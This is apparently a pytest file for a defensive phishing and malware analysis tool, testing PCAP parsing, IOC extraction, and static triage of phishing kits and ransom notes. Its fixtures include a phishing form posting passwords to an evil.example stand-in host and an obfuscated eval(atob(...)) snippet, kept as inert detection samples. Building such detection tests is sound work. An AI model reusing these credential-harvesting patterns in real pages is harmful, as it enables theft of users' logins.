from __future__ import annotations

import json
import struct

from fastapi.testclient import TestClient

from phishhunter.analysis.deep_services import deep_domain_analysis, deep_ioc_analysis, deep_phishing_kit_analysis, deep_ransomware_analysis
from phishhunter.analyzers.pcap.analyzer import analyze_pcap
from phishhunter.main import app


def _minimal_pcap() -> bytes:
    eth = b"\x00" * 12 + struct.pack("!H", 0x0800)
    ip = bytes([0x45, 0, 0, 40]) + b"\x00\x01\x00\x00" + bytes([64, 6, 0, 0]) + bytes([192, 168, 1, 10]) + bytes([1, 1, 1, 1])
    tcp = struct.pack("!HHIIHHHH", 12345, 80, 0, 0, 0x5002, 8192, 0, 0)
    payload = eth + ip + tcp
    return struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1) + struct.pack("<IIII", 1, 0, len(payload), len(payload)) + payload


def test_pcap_result_is_json_serializable():
    result = analyze_pcap(_minimal_pcap())
    json.dumps(result)
    assert result["packet_count"] == 1
    assert result["flows"][0]["dport"] == 80


def test_deep_ioc_engine_normalizes_multiple_indicator_types():
    result = deep_ioc_analysis("hxxps://evil.example/login 203.0.113.8 44d88612fea8a8f36de82e1278abb02f")
    assert "https://evil.example/login" in result["iocs"]["urls"]
    assert "203.0.113.8" in result["iocs"]["ips"]
    assert result["counts"]["hashes"] == 1


def test_phishing_kit_static_analysis_never_executes_script():
    result = deep_phishing_kit_analysis("kit.html", b'<form action="https://evil.example/collect"><input type="password"></form><script>eval(atob("QQ=="))</script>')
    assert result["static_only"] is True
    assert result["risk_score"] >= 20
    assert result["forms"][0]["password"] is True


def test_ransomware_triage_is_static():
    result = deep_ransomware_analysis("READ_ME.txt", b"YOUR FILES ARE ENCRYPTED. PAY BITCOIN TO DECRYPT.")
    assert result["ransomware_context"]["static_only"] is True
    assert result["risk_score"] >= 20


def test_service_routes_are_real_workflows_not_placeholder_pages():
    with TestClient(app) as client:
        response = client.post("/services/graph", data={"indicator": "example.com 8.8.8.8"})
        assert response.status_code == 200
        assert "Relationship graph data" in response.text
        response = client.post("/services/reports", data={"title": "Test", "analysis_json": json.dumps({"verdict": "review", "risk_score": 20, "iocs": {}, "findings": []})})
        assert response.status_code == 200
        assert "Complete analysis JSON" in response.text
